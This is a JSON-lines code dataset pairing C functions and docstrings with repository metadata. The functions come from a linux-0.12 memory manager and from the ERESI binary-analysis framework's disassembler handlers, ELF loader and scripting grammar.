\u88ab\u4e24\u5957\u9875\u8868\u6620\u5c04\u800c\u5171\u4eab\u4f7f\u7528\u3002\u590d\u5236\u65f6\uff0c\u9700\u7533\u8bf7\u65b0\u9875\u9762\u6765\u5b58\u653e\u65b0\u9875\u8868\uff0c\u539f\u7269\u7406\u5185\u5b58\u533a\u5c06\u88ab\u5171\u4eab\u3002\u6b64\u540e\u4e24\u4e2a\u8fdb\u7a0b(\u7236\n * \u8fdb\u7a0b\u548c\u5176\u5b50\u8fdb\u7a0b)\u5c06\u5171\u4eab\u5185\u5b58\u533a\uff0c\u76f4\u5230\u6709\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u5199\u64cd\u4f5c\u65f6\uff0c\u5185\u6838\u624d\u4f1a\u4e3a\u5199\u64cd\u4f5c\u8fdb\u7a0b\u5206\u914d\u65b0\u7684\u5185\u5b58\u9875\u3002\n * @param[in]\tfrom\t\u6e90\u7ebf\u6027\u5730\u5740\n * @param[in]\tto\t\t\u76ee\u6807\u7ebf\u6027\u5730\u5740\n * @param[in]\tsize\t\u9700\u8981\u590d\u5236\u7684\u957f\u5ea6(\u5355\u4f4d\u662f\u5b57\u8282)\n * @return\t\t0\n */\n", "func_signal": "int copy_page_tables(unsigned long from, unsigned long to, long size)", "code": "{\n\tunsigned long * from_page_table;\n\tunsigned long * to_page_table;\n\tunsigned long this_page;\n\tunsigned long * from_dir, * to_dir;\n\tunsigned long new_page;\n\tunsigned long nr;\n\n\t/* \u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\u90fd\u9700\u8981\u57284MB\u5185\u5b58\u8fb9\u754c\u5730\u5740 */\n\tif ((from & 0x3fffff) || (to & 0x3fffff)) {\n\t\tpanic(\"copy_page_tables called with wrong alignment\");\n\t}\n\t/* \u6e90\u5730\u5740\u7684\u76ee\u5f55\u9879\u6307\u9488\uff0c\u76ee\u6807\u5730\u5740\u7684\u76ee\u5f55\u9879\u6307\u9488\uff0c \u9700\u8981\u590d\u5236\u7684\u76ee\u5f55\u9879\u6570 */\n\tfrom_dir = (unsigned long *) ((from >> 20) & 0xffc); \t/* _pg_dir = 0 */\n\tto_dir = (unsigned long *) ((to >> 20) & 0xffc);\n\tsize = ((unsigned) (size + 0x3fffff)) >> 22;\n\t/* \u5f00\u59cb\u9875\u8868\u9879\u590d\u5236\u64cd\u4f5c */\n\tfor( ; size-- > 0 ; from_dir++, to_dir++) {\n\t\tif (1 & *to_dir) {\n\t\t\tpanic(\"copy_page_tables: already exist\");\n\t\t}\n\t\tif (!(1 & *from_dir)) {\n\t\t\tcontinue;\n\t\t}\n\t\tfrom_page_table = (unsigned long *) (0xfffff000 & *from_dir);\n\t\tif (!(to_page_table = (unsigned long *) get_free_page())) {\n\t\t\treturn -1;\t\t/* Out of memory, see freeing */\n\t\t}\n\t\t*to_dir = ((unsigned long) to_page_table) | 7;\n\t\t/* \u6e90\u5730\u5740\u5728\u5185\u6838\u7a7a\u95f4\uff0c\u5219\u4ec5\u9700\u590d\u5236\u524d160\u9875\u5bf9\u5e94\u7684\u9875\u8868\u9879(nr = 160)\uff0c\u5bf9\u5e94640KB\u5185\u5b58 */\n\t\tnr = (from == 0) ? 0xA0 : 1024;\n\t\t/* \u5faa\u73af\u590d\u5236\u5f53\u524d\u9875\u8868\u7684nr\u4e2a\u5185\u5b58\u9875\u9762\u8868\u9879 */\n\t\tfor ( ; nr-- > 0 ; from_page_table++, to_page_table++) {\n\t\t\tthis_page = *from_page_table;\n\t\t\tif (!this_page) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t/* \u8be5\u9875\u9762\u5728\u4ea4\u6362\u8bbe\u5907\u4e2d\uff0c\u7533\u8bf7\u4e00\u9875\u65b0\u7684\u5185\u5b58\uff0c\u7136\u540e\u5c06\u4ea4\u6362\u8bbe\u5907\u4e2d\u7684\u6570\u636e\u8bfb\u53d6\u5230\u8be5\u9875\u9762\u4e2d */\n\t\t\tif (!(1 & this_page)) {\n\t\t\t\tif (!(new_page = get_free_page())) {\n\t\t\t\t\treturn -1;\n\t\t\t\t}\n\t\t\t\tread_swap_page(this_page >> 1, (char *) new_page);\n\t\t\t\t*to_page_table = this_page;\n\t\t\t\t*from_page_table = new_page | (PAGE_DIRTY | 7);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tthis_page &= ~2;\t/* \u8ba9\u9875\u8868\u9879\u5bf9\u5e94\u7684\u5185\u5b58\u9875\u9762\u53ea\u8bfb */\n\t\t\t*to_page_table = this_page;\n\t\t\t/* \u7269\u7406\u9875\u9762\u7684\u5730\u5740\u57281MB\u4ee5\u4e0a\uff0c\u5219\u9700\u5728mem_map[]\u4e2d\u589e\u52a0\u5bf9\u5e94\u9875\u9762\u7684\u5f15\u7528\u6b21\u6570 */\n\t\t\tif (this_page > LOW_MEM) {\n\t\t\t\t*from_page_table = this_page;\t/* \u4ee4\u6e90\u9875\u8868\u9879\u4e5f\u53ea\u8bfb */\n\t\t\t\tthis_page -= LOW_MEM;\n\t\t\t\tthis_page >>= 12;\n\t\t\t\tmem_map[this_page]++;\n\t\t\t}\n        }\n    }\n\tinvalidate();\n\treturn 0;\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * Handler for the aaa instruction, opcode 0x37\n * @param new Pointer to instruction structure.\n * @param opcode Pointer to data to disassemble.\n * @param len Length of data to disassemble.\n * @param proc Pointer to processor structure.\n * @return Length of disassembled instruction.\n*/\n", "func_signal": "int     op_aaa(asm_instr *new, u_char *opcode, u_int len, asm_processor *proc)", "code": "{\n  new->ptr_instr = opcode;\n  new->len += 1;\n  new->instr = ASM_AAA;\n  new->type = ASM_TYPE_WRITEFLAG | ASM_TYPE_READFLAG | ASM_TYPE_ARITH;\n  new->flagswritten = ASM_FLAG_AF | ASM_FLAG_CF;\n  new->flagsread = ASM_FLAG_AF;\n  return (new->len);\n}", "path": "libasm\\src\\arch\\ia32\\handlers\\op_aaa.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * Find in the available objects list the most important symbol with this name \n * @param name\n * @return\n */\n", "func_signal": "elfshobj_t\t*elfsh_find_obj_by_symbol(char *name)", "code": "{\n  elfshobj_t\t*curidx;\n  elfshobj_t\t*choice;\n  elfsh_Sym\t*symchoice;\n  elfsh_Sym\t*sym;\n  int\t\tindex;\n  char\t\t**keys;\n  int\t\tkeynbr;\n\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n\n  choice = NULL;\n  symchoice = sym = NULL;\n\n#if\t__DEBUG_STATIC__\t      \n  printf(\"[DEBUG_STATIC] Looking for %s \\n\", name);\n#endif\n\n  /* Look in the user owned files */\n  keys = hash_get_keys(hash_workspace, &keynbr);\n  for (index = 0; index < keynbr; index++)\n    {\n      curidx = hash_get(hash_workspace, keys[index]);\n      sym = elfsh_get_metasym_by_name(curidx, name);\n      if (sym && (!symchoice || (sym == elfsh_strongest_symbol(symchoice, sym))))\n\t{\n\t  symchoice = sym;\n\t  choice = curidx;\n#if\t__DEBUG_STATIC__\t      \n\t  printf(\"[DEBUG_STATIC] Found stronger sym %s (\" AFMT \") \"\n\t\t \"in %s [WSLIST] \\n\", name, symchoice->st_value, choice->name);\n#endif\n\t}\n    } \n  \n  /* If the selected et_rel is beeing injected warn caller */\n  if (choice->pending)\n    PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, NULL) ;\n\n  /* If we found something in the local list, do not search in the shared one */\n  if (symchoice != NULL)\n    PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, (choice)) ;\n\n  /* Now look in the shared files */\n  if (!hash_shared)\n    goto end;\n\n  keys = hash_get_keys(hash_shared, &keynbr);\n  for (index = 0; index < keynbr; index++)\n    {\n      curidx = hash_get(hash_shared, keys[index]);\n      sym = elfsh_get_metasym_by_name(curidx, name);\n      if (sym && (!symchoice || (sym == elfsh_strongest_symbol(symchoice, sym))))\n\t{\n\t  symchoice = sym;\n\t  choice = curidx;\n#if\t__DEBUG_STATIC__\t      \n\t  printf(\"Found stronger symbol %s (\"AFMT\") in %s [SHAREDLIST] \\n\",\n\t\t name, symchoice->st_value, choice->name);\n#endif      \n\t  \n\t}\n    }\n  \n  end:\n  \n  /* If the selected et_rel is beeing injected warn caller */\n  if (choice->pending)\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, NULL);\n  \n  /* If we found something in the local list, do not search in the shared one */\n  if (symchoice != NULL)\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, (choice));\n  \n  PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n\t\t    \"Object not found\", ((void *) -1));\n}", "path": "libelfsh\\search.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * @brief Lookup a parameter with 3 fields, 3rd field beeing an index\n * Used by GOT, CTORS, DTORS\n */\n", "func_signal": "revmobj_t\t\t*parse_lookup3_index(char *param, char *fmt, u_int sep)", "code": "{\n  revmL1_t\t\t*l1;\n  void\t\t\t*robj;\n  void\t\t\t*o1;\n  u_int\t\t\tsize;\n  u_int\t\t\treal_index;\n  revmobj_t\t\t*pobj;\n  char\t\t\tobj[ERESI_MEANING];\n  char\t\t\tL1field[ERESI_MEANING];\n  char\t\t\tindex[ERESI_MEANING];\n\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n  if (sep != 1)\n    PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, NULL);\n\n  real_index = 0;\n\n  // Check if this handler is the correct one\n  size = parse_lookup_varlist(param, fmt, obj, L1field, index);\n  if (size != 3)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Parser handling failed\", NULL);\n\n  // Let's ask the hash table for the current working file\n  robj = revm_lookup_file(obj);\n  if (robj == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Cannot find requested file object\", NULL);\n\n  // Then, we ask the Level 1 object\n  l1 = hash_get(&L1_hash, L1field);\n  if (l1 == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Cannot find requested L1 object\", NULL);\n\n  else if (l1->get_entptr == NULL || l1->get_obj == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Bad object path\", NULL);\n\n  pobj = revm_create_IMMED(ASPECT_TYPE_UNKNOW, 0, 0);\n  pobj->immed = 0;\n\n  // Lookup object\n  o1 = l1->get_obj(robj, &size);\n\n  // Lookup index\n  real_index = revm_lookup_index(index);\n\n  //printf(\"GOT real_index = \" XFMT \" unsigned: \" UFMT \" signed: \" DFMT \"\\n\",\n  // real_index, real_index, real_index);\n\n  if (((int) real_index) < 0)\n    {\n\n      if (l1->get_obj_nam == NULL)\n        PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                          \"Invalid L1 index\", NULL);\n      else\n        {\n\n          //printf(\"looking up get_obj_name in GOT ! \\n\");\n\n          pobj->parent = l1->get_obj_nam(robj, index);\n\n          /*\n          printf(\"GOT pobjparent = %p (with name = %s) \\n\", pobj->parent, index);\n          printf(\"GOT sect data  = %p (GOT name = %s) \\n\",\n                 ((elfshobj_t *) robj)->secthash[ELFSH_SECTION_GOT]->data,\n                 ((elfshobj_t *) robj)->secthash[ELFSH_SECTION_GOT]->name);\n          */\n\n          if (pobj->parent == NULL)\n            PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                              \"No entry by that name\", NULL);\n        }\n    }\n\n  // Do index sanity\n  if (pobj->parent == NULL)\n    {\n      if (size <= real_index)\n        PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                          \"Index too big\", NULL);\n      pobj->parent  = l1->get_entptr(o1, real_index);\n    }\n\n  // Finally we fill the intermediate object format for the guessed object\n  pobj->get_obj = (void *) l1->get_entval;\n  pobj->set_obj = (void *) l1->set_entval;\n  pobj->otype   = aspect_type_get_by_id(ASPECT_TYPE_CADDR);\n  pobj          = revm_check_object(pobj);\n  if (!pobj)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Invalid REVM object\", NULL);\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, pobj);\n}", "path": "librevm\\lang\\grammar.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/*\n  <instruction func=\"op_loopne\" opcode=\"0xe0\"/>\n*/\n", "func_signal": "int op_loopne(asm_instr *new, u_char *opcode, u_int len, asm_processor *proc)", "code": "{\n  new->instr = ASM_LOOPNE;\n  new->type = ASM_TYPE_BRANCH | ASM_TYPE_CONDCONTROL | ASM_TYPE_READFLAG;\n  new->ptr_instr = opcode;\n  new->len += 1;\n  new->flagsread = ASM_FLAG_ZF;\n\n  new->len += asm_operand_fetch(&new->op[0], opcode + 1, ASM_CONTENT_SHORTJUMP, new);\n\n  return (new->len);\n}", "path": "libasm\\src\\arch\\ia32\\handlers\\op_loopne.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/*\n  <i386 func=\"i386_cmove\" opcode=\"0x44\"/>\n*/\n", "func_signal": "int i386_cmove(asm_instr *new, u_char *opcode, u_int len,\n\t       asm_processor *proc)", "code": "{\n  new->len += 1;\n  new->instr = ASM_CMOVE;\n\n#if LIBASM_USE_OPERAND_VECTOR\n  new->len += asm_operand_fetch(&new->op[0], opcode + 1, ASM_CONTENT_GENERAL, new);\n  new->len += asm_operand_fetch(&new->op[1], opcode + 1, ASM_CONTENT_ENCODED, new);\n#else\n  new->op[0].content = ASM_CONTENT_GENERAL;\n  new->op[1].content = ASM_CONTENT_ENCODED;\n  operand_rv_rmv(new, opcode + 1, len - 1, proc);\n#endif\n  return (new->len);\n}", "path": "libasm\\src\\arch\\ia32\\handlers\\i386_cmove.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * @brief Parse a vector access\n */\n", "func_signal": "revmobj_t\t*parse_vector(char *param, char *fmt)", "code": "{\n  u_int\t\tsize;\n  char\t\tindex[ERESI_MEANING];\n  vector_t\t*cur;\n  int\t\tdimnbr;\n  unsigned int\t*dims;\n  revmobj_t\t*ret;\n\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n\n  size = parse_lookup_varlist(param, fmt, index);\n  if (size != 1)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Parser handling failed\", NULL);\n  if (!strchr(index, ':'))\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Index parser failed\", NULL);\n\n  /* Grab the vector */\n  dimnbr = revm_vectors_getdimnbr(index);\n  dims = alloca(dimnbr * sizeof(unsigned int));\n  revm_vectors_getdims(index, dims);\n  cur = aspect_vector_get(index);\n\n  /* Early sanity checks */\n  if (!cur)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Unknown requested vector\", NULL);\n  if (revm_vector_bad_dims(cur, dims, dimnbr))\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Requested vector with bad dimensions\", NULL);\n\n  /* Get a pointer on the desired entry of the vector */\n  XALLOC(__FILE__, __FUNCTION__, __LINE__,ret, sizeof(revmobj_t), NULL);\n  ret->parent   = aspect_vectors_selectptr(cur, dims);\n  ret->otype    = aspect_type_get_by_id(cur->type);\n  ret->perm     = 1;\n  ret->immed    = 0;\n  ret->get_obj  = (void *) revm_long_getobj;\n  ret->set_obj  = (void *) revm_long_setobj;\n\n  /* Success */\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);\n}", "path": "librevm\\lang\\grammar.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * Lookup a parameter with 5 fields, 3rd and 5th field beeing indexes\n * Used for Relocation tables and GOT tables\n */\n", "func_signal": "revmobj_t\t\t*parse_lookup5_index(char *param, char *fmt, u_int sep)", "code": "{\n  revmL1_t\t\t*l1;\n  revmL2_t\t\t*l2;\n  void\t\t\t*robj;\n  void\t\t\t*o1;\n  int\t\t\treal_index;\n  int\t\t\treal_index2;\n  u_int\t\t\tsize;\n  int\t\t\tisversion;\n  revmobj_t\t\t*pobj;\n  elfshsect_t\t\t*sect;\n  char\t\t\tobj[ERESI_MEANING];\n  char\t\t\tL1field[ERESI_MEANING];\n  char\t\t\tL2field[ERESI_MEANING];\n  char\t\t\tindex[ERESI_MEANING];\n  char\t\t\tindex2[ERESI_MEANING];\n  int\t\t\tret;\n\n#if 0\n  char\t\t\tlogbuf[BUFSIZ];\n#endif\n\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n  if (sep != 2)\n    PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, NULL);\n\n  // Check if this handler is the correct one\n  ret = parse_lookup_varlist(param, fmt, obj, L1field, index, index2, L2field);\n  if (ret != 5)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Parser handling failed\", NULL);\n\n  // Let's ask the hash table for the current working file\n  robj = revm_lookup_file(obj);\n  if (robj == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Cannot find requested file object\",\n                      NULL);\n\n  // Then, we ask the Level 1 object\n  l1 = hash_get(&L1_hash, L1field);\n  if (l1 == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Cannot find requested L1 object\", NULL);\n  else if (l1->get_entptr == NULL || l1->get_obj_idx == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"This object needs 2 indexes\", NULL);\n\n  // Then the Level 2 object\n  l2 = hash_get(l1->l2list, L2field);\n  if (l2 == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Cannot find requested L2 object\", NULL);\n  else if (l2->get_obj == NULL || l2->set_obj == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Child object is invalid\", NULL);\n\n  // Not clean .. need to ve virtualized\n  isversion = (!strcmp(L1field, \"version\") ||\n               !strcmp(L1field, \"verdef\") ||\n               !strcmp(L1field, \"verneed\"));\n\n  // Get indexes\n  real_index  = (int) revm_lookup_index(index);\n  real_index2 = (int) revm_lookup_index(index2);\n\n#if 0\n snprintf(logbuf, BUFSIZ - 1,\n          \"[DEBUG_MODEL] Lookup5_index : index(\" UFMT \") rindex(\" UFMT \") \\n\",\n          real_index, real_index2);\n revm_output(logbuf);\n#endif\n\n  // Do index sanity\n  o1 = l1->get_obj_idx(robj, real_index, (u_int *) &size);\n  if (!isversion && size <= real_index2)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Second index too big\", NULL);\n\n  if (isversion && o1 == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Invalid L1 index\", NULL);\n\n  // printf(\"[DEBUG_RELOCS_IDX2] o1 = %p, o1->data = %p (%s) \\n\",\n  // o1, ((elfshsect_t*)o1)->data, ((elfshsect_t*)o1)->name);\n\n  //\n  // This elfsh_get_reloc() returns a elfshsect_t *,\n  // and we need to grab the ->data pointer, to avoid rewriting a\n  // new handler (its not fair but it works .. ;) and its acceptable\n  // since only relocation tables use this rule.\n\n  sect = (elfshsect_t *) o1;\n  o1 = elfsh_readmem(sect);\n\n  // Finally we fill the intermediate object format for the guessed object\n  pobj = revm_create_IMMED(ASPECT_TYPE_UNKNOW, 0, 0);\n  pobj->immed = 0;\n  pobj->get_obj = (void *) l2->get_obj;\n  pobj->set_obj = (void *) l2->set_obj;\n  pobj->otype   = aspect_type_get_by_id(l2->type);\n\n  // ugly flag to put for dynamic Rel vs Rela information\n  elfsh_setrel(IS_REL(sect));\n  pobj->parent  = l1->get_entptr(o1, real_index2);\n\n  if (isversion && pobj->parent == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Unknown L2 object or Invalid L2 index\",\n                      NULL);\n\n  // Error checking\n  pobj = revm_check_object(pobj);\n  if (!pobj)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Invalid REVM object\", NULL);\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, pobj);\n}", "path": "librevm\\lang\\grammar.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * Load all the part of the binary.\n * This function should not be used by e2dbg \n * @param file\n * @return\n */\n", "func_signal": "int\t\t        elfsh_read_obj(elfshobj_t *file)", "code": "{\n  elfshsect_t\t\t*actual;\n  int\t\t\tindex;\n\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n\n  if (file->read)\n    PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, 0);\n  if (file->sht == NULL && NULL == elfsh_get_sht(file, NULL))\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, \n                 \"Unable to grab SHT\", -1);\n  if (NULL == elfsh_get_pht(file, NULL) && file->hdr->e_type != ET_REL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, \n                 \"Unable to grab PHT\", -1);\n\n#if __DEBUG_MAP__\n  puts(\"[DEBUG:read_obj] Loading all known typed sections\\n\");\n#endif\n\n  /* Fill multiple relocation sections */\n  for (index = 0; NULL != \n       (actual = elfsh_get_reloc(file, index, NULL)); \n       index++);\n\n  /*\n  ** Load sections placed after symtab\n  ** Added for Solaris\n  */\n  elfsh_get_comments(file);\n  elfsh_get_dwarf(file);\n  elfsh_get_stab(file, NULL);\n  \n  if (file->hdr->e_type == ET_CORE) \n    {\n      elfsh_get_core_notes(file);\n      goto out;\n    }\n\n\n  /*\n   ** We cannot use simply elfsh_get_anonymous_section() here\n   ** because the object's section hash ptrs would not be filled.\n   */\n  elfsh_get_symtab(file, NULL);\n\n  /* Fixup stuffs in the SHT */\n  elfsh_fixup(file);\n\n  elfsh_get_dynsymtab(file, NULL);\n  elfsh_get_stab(file, NULL);\n  elfsh_get_dynamic(file, NULL);\n  elfsh_get_ctors(file, NULL);\n  elfsh_get_dtors(file, NULL);\n  elfsh_get_got(file, NULL);\n  elfsh_get_interp(file);\n\n  elfsh_get_versymtab(file, NULL);\n  elfsh_get_verneedtab(file, NULL);\n  elfsh_get_verdeftab(file, NULL);\n  elfsh_get_hashtable(file, NULL);\n\n  //elfsh_get_comments(file);\n  elfsh_get_plt(file, NULL);\n\n  /* Fill the multiple notes sections */\n  for (index = 0; NULL != elfsh_get_notes(file, index); index++);\n\n  /* Loop on the section header table and load all unknown-typed sections */\n  for (actual = file->sectlist; actual; actual = actual->next)\n  {\n    /* Fix first section size */\n    if (actual->shdr->sh_size == 0 && actual->next &&\n        actual->next->shdr->sh_offset != actual->shdr->sh_offset &&\n\tactual->next->shdr->sh_addr   != actual->shdr->sh_addr)\n      actual->shdr->sh_size =\n        actual->next->shdr->sh_offset - actual->shdr->sh_offset;\n\n    /* If the section data has to be loaded, load it */\n    /* In case of bss, only load if BSS data is inserted in the file */\n    if (actual->data == NULL && actual->shdr->sh_size)\n    {\n      if ((actual->shdr->sh_type == SHT_NOBITS && \n           actual->shdr->sh_offset == actual->next->shdr->sh_offset) ||\n          (actual->next != NULL && actual->next->shdr->sh_offset == actual->shdr->sh_offset))\n        continue;\n\n#if __DEBUG_MAP__\n      printf(\"[LIBELFSH] Loading anonymous  section %15s \\n\",\n             elfsh_get_section_name(file, actual));\n#endif\n      elfsh_get_anonymous_section(file, actual);\n    }\n  }\n\n  /* Fixup various symbols like dynamic ones that are NULL */\n  /* Non fatal error */\n  if (file->secthash[ELFSH_SECTION_DYNSYM])\n    elfsh_fixup_dynsymtab(file->secthash[ELFSH_SECTION_DYNSYM]);\n\nout:\n  /* We close the file descriptor after file mapping so we can open more files */\n  if (file->fd >= 0) {\n#if __DEBUG_MAP__\n    printf(\"[LIBELFSH] Closing descriptor %d \\n\",\n           file->fd);\n#endif\n\n    XCLOSE(file->fd, -1);\n    /* neutralize file descriptor */\n    file->fd = -1;\n  }\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, 0);\n}", "path": "libelfsh\\map.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n *\n * <instruction func=\"op_lodsb\" opcode=\"0xac\"/>\n */\n", "func_signal": "int op_lodsb(asm_instr *new, u_char *opcode, u_int len, asm_processor *proc)", "code": "{\n  new->instr = ASM_LODSB;\n  new->len += 1;\n  new->ptr_instr = opcode;\n  new->type = ASM_TYPE_LOAD;\n  new->len += asm_operand_fetch(&new->op[0], opcode, ASM_CONTENT_YDEST, new);\n  new->len += asm_operand_fetch(&new->op[1], opcode, ASM_CONTENT_FIXED, new);\n  new->op[1].type = ASM_OPTYPE_REG;\n  new->op[1].regset = asm_proc_opsize(proc) ? ASM_REGSET_R16 : ASM_REGSET_R32;    \n  new->op[1].baser = ASM_REG_EAX;\n  return (new->len);\n}", "path": "libasm\\src\\arch\\ia32\\handlers\\op_lodsb.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * Fixup the binary, inject symbols and sort SHT \n * @param file\n * @return\n */\n", "func_signal": "void\t\t      elfsh_fixup(elfshobj_t *file)", "code": "{\n  elfsh_Shdr\t*got;\n\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n\n  if (file->hdr->e_type == ET_REL || elfsh_static_file(file))\n    elfsh_sort_sht(file);\n\n  /* .got sht entsize fixup */\n  got = elfsh_get_sht_entry_by_name(file, ELFSH_SECTION_NAME_GOT);\n  if (got != NULL && got->sh_entsize == 0)\n    got->sh_entsize = sizeof(eresi_Addr);\n\n  PROFILER_OUT(__FILE__, __FUNCTION__, __LINE__);\n}", "path": "libelfsh\\map.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/*\n  <instruction func=\"op_jbe\" opcode=\"0x76\"/>\n*/\n", "func_signal": "int  op_jbe(asm_instr *new, u_char *opcode, u_int len, asm_processor *proc)", "code": "{\n  new->len += 1;\n  new->ptr_instr = opcode;\n  new->type = ASM_TYPE_BRANCH | ASM_TYPE_CONDCONTROL;\n  new->instr = ASM_BRANCH_U_LESS_EQUAL;\n\n  new->len += asm_operand_fetch(&new->op[0], opcode + 1, ASM_CONTENT_SHORTJUMP, new);\n\n  return (new->len);\n}", "path": "libasm\\src\\arch\\ia32\\handlers\\op_jbe.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * @brief Register list of objects to work with \n * @param prvhash\n * @param sharedhash\n * @return\n */\n", "func_signal": "int\t\telfsh_register_working_objects(hash_t *prvhash,\n\t\t\t\t\t       hash_t *sharedhash)", "code": "{\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n  hash_workspace = prvhash;\n  hash_shared    = sharedhash;\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, 0);\n}", "path": "libelfsh\\search.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * @brief Parse a hash access\n */\n", "func_signal": "revmobj_t\t*parse_list(char *param, char *fmt)", "code": "{\n  u_int\t\tsize;\n  char\t\tindex[ERESI_MEANING];\n  list_t\t*list;\n  revmobj_t\t*ret;\n  char\t\t*entryname;\n  char\t\t*listname;\n  void\t\t*ptr;\n\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n\n  size = parse_lookup_varlist(param, fmt, index);\n  if (size != 1)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                      \"Parser handling failed\", NULL);\n\n  /* Get hash table and entry */\n  entryname = strchr(index, ':');\n  if (entryname)\n    *entryname++ = 0x00;\n  listname  = revm_lookup_key(index);\n  if (!listname)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                 \"Unknown list\", NULL);\n\n  /* Resolve entry name without messing with variable type */\n  if (entryname)\n    {\n      entryname = revm_lookup_key(entryname);\n      if (!entryname)\n        PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__,\n                     \"Unknown list element\", NULL);\n    }\n\n  /* In case the hash table does not exist, create it empty */\n  list = elist_find(listname);\n  if (!list)\n    {\n      XALLOC(__FILE__, __FUNCTION__, __LINE__,\n             list, sizeof(list_t), NULL);\n      elist_init(list, listname, ASPECT_TYPE_UNKNOW);\n    }\n\n  /* Now deal with the entry */\n  ptr = (entryname ? elist_get(list, entryname) : (void *) list);\n\n  /* Get an revm object */\n  XALLOC(__FILE__, __FUNCTION__, __LINE__, ret, sizeof(revmobj_t), NULL);\n  ret->parent   = ptr;\n  ret->otype    = aspect_type_get_by_id((entryname ? list->type : ASPECT_TYPE_LIST));\n  ret->hname    = (listname ? strdup(listname) : NULL);\n  ret->kname    = (entryname ? strdup(entryname) : NULL);\n  ret->contype  = CONT_LIST;\n  ret->perm     = 1;\n  ret->immed    = 0;\n  ret->get_obj  = revm_hash_getobj; /* We can keep this one for lists too */\n  ret->set_obj  = (void *) (entryname ? revm_long_setobj : NULL);\n\n  /* Success */\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);\n}", "path": "librevm\\lang\\grammar.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
